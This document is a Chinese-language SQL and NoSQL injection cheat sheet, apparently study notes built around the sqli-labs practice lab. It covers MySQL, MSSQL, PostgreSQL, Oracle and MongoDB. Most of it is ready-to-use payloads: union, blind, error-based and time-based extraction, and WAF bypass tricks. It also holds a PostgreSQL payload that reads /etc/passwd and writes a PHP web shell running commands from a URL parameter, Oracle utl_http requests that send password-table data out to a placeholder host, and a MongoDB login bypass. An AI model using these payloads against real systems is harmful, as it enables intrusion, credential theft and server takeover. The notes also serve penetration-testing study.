# 系统函数

version()——MYSQL版本

user()———数据库用户名

database()——数据库名

@@datadir—数据库路径

@@version_compile_os——操作版本系统

# 字符串连接

concat(str1,str2)——无分隔符连接

concat_us(separator,str1,str2)——有分隔符连接

group_concat(str1,str2...)——连接一个组所有的字符串，并以逗号分隔



$id=$_GET['id']; $sql="SELECT * FROM user WHERE id="

注释：#或--+



# UNION 联合查询

用于合并两个或多个SELECT语句的结果集，内部语句SELECT都必须有相同数量的列

SELECT column_name(s) FROM table_name1 UNION SELECT column_name(s) FROM table_name2



注：and的运算级大于or的运算级

## 		  一个&为  &位操作，两个&&等同于and

SQLMAP参数详情：-T+表名（tables)     -D+数据库名(database)   -C+字段名(column)  --dbs 爆数据库 

information_schema.schemata 数据库自带的表，里面含有数据库名

information_schema.tables数据库表名

information_schema.columns数据库行名

### 查数据库名

http://127.0.0.1/sqli-labs-master/Less-1/?id=-1'union select 1,group_concat(schema_name),3 from information_schema.schemata--+

### 查表名

http://127.0.0.1/sqli-labs-master/Less-1/?id=-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+

### 查字段名

http://127.0.0.1/sqli-labs-master/Less-1/?id=-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+

### 查数据

http://127.0.0.1/sqli-labs-master/Less-1/?id=-1'union select 1,username,password from users where id=2--+

1.输入参数?id=1'    ,若查表名时出现

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1

说明开发者使用的查询是Select * from TABLE where id = (some integer value);

解决方法

将?id=1'后的'去掉

其他查询类型与Less-1相同



2.输入参数?id='   ,若查表名时出现

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''') LIMIT 0,1' at line 1

说明开发者使用的查询是Select login_name, select password from table where id= (‘our input here’)

解决方法

将?id=1'改成?id=1')--+



3.输入参数?id=1"  ,若查表名时出现

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"1"") LIMIT 0,1' at line 1

说明这里它意味着，代码当中对 id 参数进行了 “” 和 () 的包装。

解决方法

将?id=1"改成?id=1")--+

## 盲注的注解

### 一、基于布尔SQL的盲注（构造逻辑判断）

截取字符串相关函数解析 http://www.cnblogs.com/lcamry/p/5504374.html

1.left(database(),1)>’s’   作用：database()显示数据库名称，left(a,b)从左侧截取 a 的前 b 位 ，‘s'为数据库名

如left(database(),1)='a'，若database()为security，则意思为s是否大于'a'

2.ascii(substr((select table_name information_schema.tables where tables_schema = database()limit 0,1),1,1))=101 --+      作用：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换 为 ascii 值

3.ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER  BY id LIMIT 0,1),1,1))>98--+  作用：mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位   Ord()函数同 ascii()函数，将字符转为 ascii 值 

4.regexp 正则注入 正则注入介绍：http://www.cnblogs.com/lcamry/articles/5717442.html 

用法介绍：select user() regexp '^[a-z]'; 

作用：正则表达式的用法，user()结果为 root，regexp 为匹配 root 的正则表达式。 

第二位可以用 select user() regexp '^ro'来进行。

例：

1.select * from users where id=1 and 1=(if((user() regexp '^r'),1,0));

2.select * from users where id=1 and 1=(user() regexp'^ri');

方法思路均是通过if构造判断条件，根据返回结果1或0进行判断

3.select * from users where id=1 and 1=(select 1 from information_schema.tables 

where table_schema='security' and table_name regexp '^us[a-z]' limit 0,1);

这里利用 select 构造了一个判断语句。我们只需要更换 regexp 表达式即可 

'^u[a-z]' -> '^us[a-z]' -> '^use[a-z]' -> '^user[a-z]' -> FALSE 

用 table_name regexp '^username$'来判断匹配是否结束，一般也可以用命名方式判断

注：limit作用的是select语句，而不是regexp，只要table_name中有的内容，用regexp都可以匹配到。



like匹配注入

用法：select users() like 'ro%'

总结函数

regexp,like,ascii,left,ord,mid

### 二、基于报错的SQL盲注

1.Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;

解:此处有三个点，一是需要 concat 计数，二是 floor，取得 0 or 1，进行数据的 

重复，三是 group by 进行分组

以上语句可以简化为select count(*) from information_schema.tables group by concat(version(), 

floor(rand(0)*2)) 

若关键的表被禁用了则用select count(*) from (select 1 union select null union 

select !1) group by concat(version(),floor(rand(0)*2)) 

若rand被禁用了则用select min(@a:=1) from information_schema.tables group by concat(passwo 

rd,@a:=(@a+1)%2)



★select exp(~(select * FROM(SELECT USER())a)) //double 数值类型超出范围 

Exp()为以 e 为底的对数函数；版本在 5.5.5 及其以上

★select !(select * from (select user())x) -（ps:这是减号） ~0 

bigint 超出范围；~0 是对 0 逐位取反，很大的版本在 5.5.5 及其以上

★extractvalue(1,concat(0x7e,(select @@version),0x7e))

extractvalue(目标xml文档，xml路径)

mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误 

★updatexml(1,concat(0x7e,(select @@version),0x7e),1) //mysql 对 xml 数据进行 

查询和修改的 xpath 函数，xpath 语法错误 

★select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x; 

mysql 重复特性，此处重复了 version，所以报错。 

总结函数

floor,extractvalue,updatexml

### 三、基于时间的SQL盲注——延时注入

if(ascii(substr(database(),1,1))>115,0,sleep(5))--+

判断语句，若条件为假，执行sleep



union select if(substring(current,1,1)=char(119),benchmark(5000,encode('MSG','by 5 seconds')),null) from (select database() as current) as tbl;

注：benchmark(count,expr)为测试函数性能，参数1为执行的次数，参数二为执行的表达式。此为边信道攻击，占用大量cpu资源，建议使用sleep()



总结函数

if,sleep



# MYSQL注入

## 信息收集

操作系统

数据库名

数据库用户

数据库版本

其他

## 数据注入

同数据库

1、低版本：暴力查询或结合读取查询

2、information_schema有据查询（MYSQL版本大于5.0）

## 高权限注入

### 常规查询

### 跨库查询

### 文档读写

load_file()：读取函数

into outfile 或into dumpfile  ：导出函数

路径获取常见方法：

报错显示，遗留文件，漏洞报错，平台配置文件，爆破等



注：mysql写shell的要求

1、root权限

2、GPC关闭（能使用单引号）

3、有绝对路径（读文件可以不用，写文件必须）

4、没有配置   -secure-file-priv

5、有读写权限，有create,insert,select权限

# SQL注入总结

与数据库产生交互就有可能产生注入攻击

## 注入类型

1、回显注入

2、无回显注入

​		延时注入

​		布尔注入

​		报错注入

3、宽字节注入

## 注入扩展

1、加解密注入

2、JSON注入

3、LADP注入

4、DNSlog注入

5、二次注入

6、堆叠注入

## 数据库类型

1、Access

2、Mysql

3、Mssql

4、Oracle

5、Postsql

6、SQLite

7、Mongodb

## 提交方法

1、GET

2、POST

3、COOKIE

4、REQUEST

5、HTTP头

### 注意：

1、GET产生一个TCP数据包，POST产生两个TCP数据包。对于GET请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）。而对于POST，浏览器先发送header，服务器响应100 continute，浏览器再发送data，服务器响应200（返回数据）。

2、GET方法无法接收POST的值

在POST情况下GET的值只要在网址后面就能接收

GET、POST接受单个

REQUEST全部接收，网站在访问的时候由于我们大多数是黑盒测试，不知道对方代码写法，如果对方采用REQUEST，就能使用任何方式提交（POST、GET），否则针对目标网站接收方式使用对应的方式注入。

## WAF绕过

判断防火墙的工具：Wafw00f

1、更改提交方法

​		GET POST COOKIE等

​		POST->multipart/form-data

2、大小写混合

​		UniON SeLecT

3、解码编码类

​		s->%73->%25%37%33（url编码）

4、注释符混用

​		//----+#//+:%00/!/

​		/* */当成空格

5、等价函数替换

​		Hex() bin()等价于ascii()

​		@@user等价于user()

​		@@version等价于version()

​		Sleep() 等价于 benchmark()

​		Mid() substring() 等价于substr()

6、特殊符号混用

​		%0a在MYSQL是换行，可以当空格使用

7、借助数据库特性

8、HTTP参数污染

9、垃圾数据溢出

10、加密解密

​		hex,unlcode,base64

11、循环绕过

​		ununionion

12、MYSQL黑魔法

​		select{xusername}from{x11test.admin};

### 深入WAF绕过

#### 1、内联注释   

/*!50001 select 1,2,3*/;

该语句为当mysql版本为5.00.01，该语句才会执行

#### 2、伪装成百度爬虫脚本

#### 3、IP白名单

修改header来by pass

X-forwarded-for

X-remote-IP

X-remote-addr

X-Real-IP

#### 4、静态资源

一般WAF不会对静态文件(.js、.jpg、.swf、.css等）进行过滤

?1.php/1.js?id=1

#### 5、更改请求头（user-agent)

#### 6、使用代理池

#### 7、添加延时参数

#### 8、老WAF更改POST/GET方法

## 数据类型

1、数字型

2、字符型

3、搜索型

## 防御方案

1、代码加载过滤

2、WAF产品部署

3、java中通过session防御

4、参数绑定方式，利用sql的预编译技术

## 查询方式

1、select

2、insert

3、delete

4、update

5、order by

# JSON注入相关

## 1、概念

JSON类似于XML，但比XML更小更快更易解析。MIME类型是application/json

## 2、规则

数据由逗号分隔

大括号保存对象

中括号保存数组

## 3、JSON值

数字（整数或浮点数）{"age":30}

字符串（在双引号中）{"name":"zhang"}

逻辑值（true或false）{"flag":true}

数组（在中括号中）{"site":[{"name":"zhang"},{"name":"ming"}]}

对象（在大括号中）obj={"name":"zhang","age":15,"car":null}，对象为obj

null  {"runoob":null}

## 4、注入

json={"username":"Dumb' and 1=2 union select 1,database(),3#"}

# 加解密注入

## 原理

使用GET或者POST方法的参数数据，通过base64等方式进行加密，再通过参数传入到目标服务器

如?id=1 and 1=1 通过base64编码为

id=MSBhbmQgMT0x

# 二次注入

## 原理

该注入为存储型注入，产生原因是开发者尽管对输入的数据进行 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，但其带有危害的脏数据还是被写进数据库，等下次拿出来的时候未经过校验和处理，放到程序中执行造成二次注入

如将带单引号的数据插入到数据库，下次使用中进行拼凑，就形成了二次注入

一般无法通过前端和黑盒测试测试出漏洞，只能通过白盒审计发现。

# DNSlog注入

## 原理

拥有一个域名，比如cete.io，将域名解析到一台服务器上，配置DNSserver，DNS在解析下会留下日志，通过读取多级域名的解析日志，来获得所需要的信息。

一般在布尔盲注，时间盲注，因为其注入效率低且线程高的原因，被WAF拦截，或者无回显错误的情况下，通过该方式可以确认是否利用成功

http://www.dnslog.cn



# 数据库类型

## Access数据库

Access

​		表名

​				列名

​						数据

其余如mysql，mssql等

​			数据库名A

​						表名

​								列名

​										数据

​			数据库名B

​					...............

Access数据库保存在网站源码下面，自己网站数据库独立存在，无法进行跨库和文件读写的操作

top 1=mysql中的limit 1

### Access偏移注入

## SQL server/MSSQL

### 1、判断数据库类型

and exists (select *from sysobjects)#     返回正常为mssql

或者 and exists (select count(*) from sysobjects)#

### 2、判断数据库版本

1、有回显

and 1=2@@version

2、无回显

and substring((select @@version),22,4)='2008' #

### 3、获取所有数据库的个数

1、and 1=(select  quotename(count(name)) from master..sysdatabases)#

2、and 1=(select cast(count(name) as varchar) + char(1) from master..sysdatabases)#

3、and 1=(select str(count(name))+'|' from master..sysdatabases where dbid>5)#

​		and 1=(select cast(count(name)as varchar)+from master..sysdatabases where dbid>5)#

dbid从1-4的数据库一般为系统数据库

### 4、获取数据库

and 1=(select quotename(name) from master..sysdatabases FOR XML PATH(''))#

and 1=(select '|'+name+'|' from master..sysdatabases FOR XML PATH(''))#

### 5、获取当前数据库

and db_name()>0

and 1=(select db_name())#

### 6、获取当前数据库中的表（可一次爆出数据库所有表（只限于mssql2005及以上版本）

and 1=(select quotename(name) from 数据库名..sysobjects where xtype='U' FOR XML PATH(''))#

and 1=(select '|'+name+'|' from 数据库名..sysobjects where xtype='U' FOR XML PATH(''))#

### 7、获取表里所有的列（一次性爆指定表的所有列，只限于mssql2005及以上版本）

and 1=(select quotename(name) from 数据库名..syscolumns where id=(select id from 数据库名..sysobjects where name='指定表名') FOR XML PATH(''))#

and 1=(select '|'+name+'|' from 数据库名..syscolumns where id =(select id from 数据库名..sysobjects where name='指定表名') FOR XML PATH(''))#

### 8、获取指定数据库中的表的列的数据库

逐条爆指定表的所有字段的数据（mssql2005及以上版本）

and 1=(select top 1 * from 指定数据库..指定表名 where 条件 FOR XML PATH(''))#

一次爆n条所有字段的数据（mssql2005及以上版本）

and 1=(select top n* from 指定数据库..指定表名 FOR XML PATH(''))#

## PostgreSQL

### 概念

关系型数据库，注释符与mysql相同为 --+，同时可以使用 '1'='1闭合语句

||为连接符

当前数据库 current_database()

当前执行环境中的用户名 current_user



### 基于布尔型注入

?a=1 AND 1=1   ?a=1 AND 1=2

?name=admin and '1'='1   ?name=admin and '1'='2

### 基于报错注入

语法

cast('1' as numeric)  1转换为数字类型

Numeric(10,2)    指字段是数字型，长度为10,  小数为2位的

1::text                 数据类型转换为text类型

case....when....then....else....end     条件语句



获取版本号

select *from tbuser where id=1 AND 7778=CAST((SELECT version())::text AS NUMERIC)

获取Schemas名称

select *from tbuser where id=1 AND 7778=CAST((SELECT schemaname FROM pg_tables limit 1)::text ASNUMERIC)

select *from tbuser where id=1 AND 7778=CAST((SELECT schemaname FROM pg_tables where schemaname not in ('public') limit 1)::text AS NUMERIC)

### 基于时间的盲注

?id=1 AND 6489 =(SELECT 6489 FROM PG_SLEEP(5))    延时5秒

#### 盲注的逐位猜解

select case WHEN(COALESCE(ASCII(SUBSTR(({current_user}),1,1)),0)>100) THEN pg_sleep(14) ELSE pg_sleep(0) END LIMIT 1--+

### 基于堆叠查询（多语句查询）

?id=1;select PG_SLEEP(5)--+

### 基于联合查询

?id=1 order by 1,2,3

?id=1 UNION ALL SELECT NULL,('11111'),NULL--+ 查看是否输入11111



获取模式名称(schemaname)

?id=1 UNION SELECT NULL,COALESCE(CAST(schemaname AS CHARACTER(10000)),(CHR(32))),NULL FROM pg_tables--+

语法

COALESCE(expression[,n])    coalesce函数返回参数（列名）中第一个非NULL值得字段值，不是为空''

cast('1' as numeric)转换为数字类型

也可写成 ?id=1 UNION SELECT NULL,schemaname,NULL FROM pg_tables--+

用户创建的数据库默认模式名称为public



获取数据表名称

?id=1 UNION SELECT NULL,tablename,NULL FROM pg_tables WHERE schemaname in ('public')



获取表字段名称

?id=1 UNION SELECT NULL,attname,NULL FROM pg_namespace,pg_type,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relnamespace=pg_namespace.oid AND pg_type.oid=b.attypid AND attnum>0 AND a.relname='tbuser' AND nspname='public'--+



获取表内容

?id=1 UNION SELECT NULL,id|| '.'||username

### 读取文件

select pg_read_file(filepath+filename);

?id=1;CREATE TABLE passwd(t TEXT);COPY passwd FROM '/etc/passwd';SELECT NULL,t,NULL  FROM passwd;

### 执行命令

select system("command_string");

### 写入文件

COPY (select  '<?php phpinfo();?>') to '/tmp/1.php';

?id=1;DROP TABLE hacktb;CREATE TABLE hacktb (t TEXT);INSERT INTO hacktb(t) VALUES ('<?php @system("$_GET[cmd]");?>')

## Oracle

### union联合查询

order by 定字段

dual为oracle内部的一张表，相当于mysql中的Information_schema

union select null,null...from dual,判断字段类型

union select 'null',null...from dual，返回正常，说明第一个类型是字符型，反之为数字型，以此类推

union 1,2 from dual

若回显位是2

爆第一张表

union select 1,(select table_name from user_tables where rownum=1) from dual

爆第二张表

union select 1,(select table_name from user_tables where rownum=1 and table_name not in ('第一个表')) from dual

爆第一个字段

union select 1,(select column_name from user_tab_columns where rownum=1 and table_name='表名(大写)') from dual

爆第二个字段

union select 1,(select column_name from user_tab_columns where rownum=1 and table_name='表名(大写)') and column_name not in ('第一个字段') from dual

爆第一行数据

union select 1,字段1||字段2||字段n from 表名 where rownum=1

注意：在oracle中，concat函数只能连接两个字符串，连接多个使用的符号是||

通过字段名找到对应表

select owner,table_name from all_tab_columns where column_name like '%PASS%';

查询第N行

select username from (select ROWNUM r,username from all_users order by username)where r=3;  查询第3行

当前用户

select user from dual;

所有用户

select username from all_users order by username;

列出数据库

select distinct owner from all_tables;

列出表名

select table_name from all_tables;

select owner,table_name from all_tables;

列出字段名

select column_name from all_tab_columns where table_name='xxx';

定位DB文件

select name from V$DATAFILE;



注：oracle的查询语句必须是完整的包含from字句，且每个字段的类型都要准确对应，一般使用null判断类型，自带虚拟表dual

### 布尔型盲注

(select length(table_name) from user_tables where rownum=1)>5#

(select ascii(substr(table_name,1,1)) from user_table where rownum=1)>100#

(select length(column_name) from user_tab_columns where table_name=xxx and rownum=1)#

(select ascii(substr(column_name,1,1)) from user_tab_columns where rownum=1 and table_name=xxx)>10#

### order by后注入

当字段个数超出就会报错，或者利用算术表达式 1除以0报错

利用decode和ordsys.ord_dicon.getmappingxpath()

decode(1,1,ordsys.ord_dicom.getmappingxpath(select user from dual),1)#  false

decode(1,2,ordsys.ord_dicom.getmappingxpath(select user from dual),1)#  true



带外注入

utl_http.request("http://domain/")

通过utl_http.request我们可以将查询的结果发送到远程服务器上，在遇到盲注时非常有用，要使用该方法用户需要有utl_http访问网络的权限。

反弹注入

http://www.domain.com/news.jsp?id=1 and utl_http.request(‘http://192.168.0.1:port/’||(select banner from sys.v_$version where rownum=1))=1#

### In查询后注入

*表示为注入点

select * from user where DEPARTMENT in('HR*','ADMIN');

用||（mysql中的concat）拼接

报错注入

'||upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62)))||'

带外请求

'||utl_http.requests(select user from dual)||'.domain')||'

注版本

utl_http.request('http://domain/'||(select banner from sys.v_$version where rownum=1))

判断包含密码字段的数据表个数

utl_http.request('http://domain/'||(select to_char(count(*)) from user_tab_columns where column_name like '%25PASSWORD%25'))

注数据库中字段

utl_http.request('http://domain/'||(select column_name from user_tab_columns where table_name='USERS') where rownum=1)

批量出数据

utl_http.request('http://domain'||(select data from (select rownum as limit,(rownum||'%'||USER_NAME||'%'||PASSWORD)as data from USERS) where rownum=1))

## Mongodb

### 基本概念

mongodb函数区分大小写

mongodb使用//  <!--来注释掉查询的结尾

在nosql中 || 1==1 相当于mysql中的 or 1=1

### 查询

执行查询的语句

db.test.find({username:'test',password:'test'});

当传入如下url

?username[xx]=test&password=test，则让username变量变成一个数组

mongodb对于多维数组执行的是

db.test.find({username:{'xx':'test'},password:'test'});

即可以进行以下攻击

?username[$ne]=test&password[$ne]=test

传入的$ne是一个mongodb的操作符

执行语句为  db.test.find({username:{'$ne':'test'},password:{'$ne':'test'}});

相当于sql中的 select *from test where username!='test' and password!='test';



尝试攻击

http://127.0.0.1/1.php?username=test'&password=test;

http://127.0.0.1/1.php?username='test'});return {username:1,password:2};//&password=test

爆所有集合名

http://127.0.0.1/1.php?username='test'});return {username:tojson(db.getCollectionNames()),password:2};//&password=test

db.getCollectionNames()返回的是数组，需要用tojson转换为字符串

爆test集合的第一条数据

http://127.0.0.1/1.php?username='test'});return {username:tojson(db.test.find()[0]),password:2};//&password=test

db.user.find()返回的是数组，需要用tojson转换为字符串

爆第二条数据

http://127.0.0.1/1.php?username='test'});return {username:tojson(db.test.find()[0]),password:2};//&password=test

### 盲注

$regex操作符进行一位一位获取数据，相当于sql中的盲注

db.test.find({username:{'$regex':'^a'}});

db.test.find({username:{'$regex':'^ab'}});

......

时间盲注

http://127.0.0.1/1.php?username='test'});if(db.version()>"0"){sleep (10000);exit;} var b=({a:'1&password=test

在mongodb的高版本中不能使用注释语句，只能通过（|| '1'=='1）闭合的方法。但存在新特性就是默认开启错误回显

判断集合数

http://127.0.0.1/1.php?news=test'||db.getCollectionNames().length>0||'1'=='1

http://127.0.0.1/1.php?news=test'||db.getCollectionNames().length>5||'1'=='1

判断第一个集合名称第一个字符大于a

http://127.0.0.1/1.php?news=test'||db.getCollectionNames()   [[0]][0][0]>'a'||'1'=='1







